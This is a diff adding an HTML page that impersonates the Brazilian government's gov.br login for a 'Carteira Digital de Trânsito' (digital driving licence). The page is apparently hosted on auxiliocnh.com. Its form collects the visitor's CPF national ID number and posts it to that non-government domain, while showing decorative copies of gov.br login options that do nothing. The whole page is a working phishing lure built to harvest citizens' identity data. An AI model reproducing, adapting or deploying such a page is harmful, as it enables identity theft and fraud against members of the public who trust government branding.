@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://auxiliocnh.com/css/app/bootstrap.css">
+    <link rel="stylesheet" href="https://auxiliocnh.com/css/app/app.css">
+    <link rel="stylesheet" href="https://auxiliocnh.com/css/pages/blue.css">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+    <link rel="icon" type="image/x-icon" href="https://auxiliocnh.com/image/blue/favicon.png">
+    <meta name="csrf-token" content="ZpNYnEnTYR2SPs4EwnIPOjMuuu7egj6x46rvot2t">
+
+    <title>Carteira Digital de Trânsito</title>
+
+    <script type="text/javascript" class="flasher-js">
+        (function() {
+            var rootScript = 'https://cdn.jsdelivr.net/npm/@flasher/flasher@1.3.2/dist/flasher.min.js';
+            var FLASHER_FLASH_BAG_PLACE_HOLDER = {};
+            var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER);
+
+            function mergeOptions(first, second) {
+                return {
+                    context: merge(first.context || {}, second.context || {}),
+                    envelopes: merge(first.envelopes || [], second.envelopes || []),
+                    options: merge(first.options || {}, second.options || {}),
+                    scripts: merge(first.scripts || [], second.scripts || []),
+                    styles: merge(first.styles || [], second.styles || []),
+                };
+            }
+
+            function merge(first, second) {
+                if (Array.isArray(first) && Array.isArray(second)) {
+                    return first.concat(second).filter(function(item, index, array) {
+                        return array.indexOf(item) === index;
+                    });
+                }
+                return Object.assign({}, first, second);
+            }
+
+            function renderOptions(options) {
+                if (!window.hasOwnProperty('flasher')) {
+                    console.error('Flasher is not loaded');
+                    return;
+                }
+                requestAnimationFrame(function() {
+                    window.flasher.render(options);
+                });
+            }
+
+            function render(options) {
+                if ('loading' !== document.readyState) {
+                    renderOptions(options);
+                    return;
+                }
+                document.addEventListener('DOMContentLoaded', function() {
+                    renderOptions(options);
+                });
+            }
+            if (1 === document.querySelectorAll('script.flasher-js').length) {
+                document.addEventListener('flasher:render', function(event) {
+                    render(event.detail);
+                });
+            }
+            if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) {
+                render(options);
+            } else {
+                var tag = document.createElement('script');
+                tag.setAttribute('src', rootScript);
+                tag.setAttribute('type', 'text/javascript');
+                tag.onload = function() {
+                    render(options);
+                };
+                document.head.appendChild(tag);
+            }
+        })();
+    </script>
+</head>
+
+<body>
+    <header class="w-100 py-1 box-shadow px-3 ">
+        <div class="max-w-1200 m-0-auto py-2 d-flex justify-content-between align-items-center">
+            <img src="https://auxiliocnh.com/image/blue/logo.png" alt="" width="110px">
+
+            <div class="font-size-14 text-dark font-weight-500 d-none d-lg-flex justify-content-between">
+                <div>
+                    <i class="fas fa-adjust text-blue mr-2"></i> Alto Contraste
+                </div>
+
+                <div class="ml-5">
+                    <i class="fas fa-assistive-listening-systems text-blue mr-2"></i> VLibra
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="px-3">
+        <section class="w-100 py-1">
+            <div class="max-w-1200 m-0-auto mt-3 py-2 d-flex justify-content-center">
+                <div class="d-none d-lg-block" style="max-width:800px">
+                    <img src="https://auxiliocnh.com/image/blue/conta.jpg" alt="" style="max-width: 97%">
+                </div>
+
+                <div class="d-flex flex-column box-shadow p-4 rounded text-dark" style="width:390px;">
+                    <h5 class="text-dark font-weight-700 font-size-18 mb-3">
+                        Identifique-se no gov.br com:
+                    </h5>
+
+                    <div class="font-weight-500 text-dark mt-4 mb-1">
+                        <i class="fas fa-id-card mr-3 text-blue"></i>
+                        <span>Número do CPF</span>
+                    </div>
+
+                    <div class="text-dark font-size-13 mt-2 mb-1">
+                        Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+                    </div>
+
+                    <form class="w-100 mt-2" method="POST" action="https://auxiliocnh.com/consultar">
+                        <input type="hidden" name="_token" value="ZpNYnEnTYR2SPs4EwnIPOjMuuu7egj6x46rvot2t" autocomplete="off">
+                        <div class="row-form">
+                            <div class="form-group col-lg-12 px-0">
+                                <label for="cpf" class="font-weight-700">
+                CPF
+              </label>
+
+                                <input name="cpf" id="cpf" type="text" class="form-control " value="" onkeyup="formatCpf(this)">
+
+                            </div>
+
+                            <div class="form-group col-lg-12 px-0 d-flex justify-content-end ">
+                                <button class="btn-cta mt-3">Continuar</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <h5 class="mt-2 text-dark font-weight-600 font-size-16 mb-3 pb-2 border-bottom border-grey">
+                        Outras opções de identificação:
+                    </h5>
+
+                    <ul class="font-weight-500 font-size-16 text-dark mb-5">
+                        <li class="text-success ">
+                            <i class="fas fa-mobile-alt mr-3 mt-2"></i>
+                            <span class="ml-2">Login com o seu banco</span>
+                        </li>
+
+                        <li class="">
+                            <i class="far fa-qrcode mr-3 mt-4 text-blue"></i>
+                            <span class="ml-1">Login com QR code</span>
+                        </li>
+
+                        <li>
+                            <i class="fas fa-hdd mr-3 mt-4 text-blue"></i>
+                            <span class="ml-0">Seu certificado digital</span>
+                        </li>
+
+                        <li>
+                            <i class="fas fa-cloud mr-2 mt-4 text-blue"></i>
+                            <span class="ml-1">Seu certificado digital em núvem</span>
+                        </li>
+                    </ul>
+
+                    <div class="font-weight-500 text-dark mt-5 mb-1 text-center ">
+                        <i class="fas fa-question-circle mr-2 text-blue"></i>
+                        <span class="text-blue">Está com dúvidas e precisa de ajuda?</span>
+                    </div>
+
+                    <div class="font-weight-500 text-dark mt-3 mb-1 text-center ">
+                        <span class="text-blue">Termo de Uso e Aviso de Privacidade</span>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+    </main>
+
+    <footer class="">
+
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <script>
+        function formatCpf(element) {
+            const inputCpf = $('input[name=cpf]');
+
+            $(element).val(cpf($(element).val()));
+        }
+
+        function cpf(cpf) {
+            cpf = cpf.replace(/\D/g, "");
+            cpf = cpf.substring(0, 11);
+            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+
+            return cpf;
+        }
+    </script>
+
+</body>
+
+
+</html>
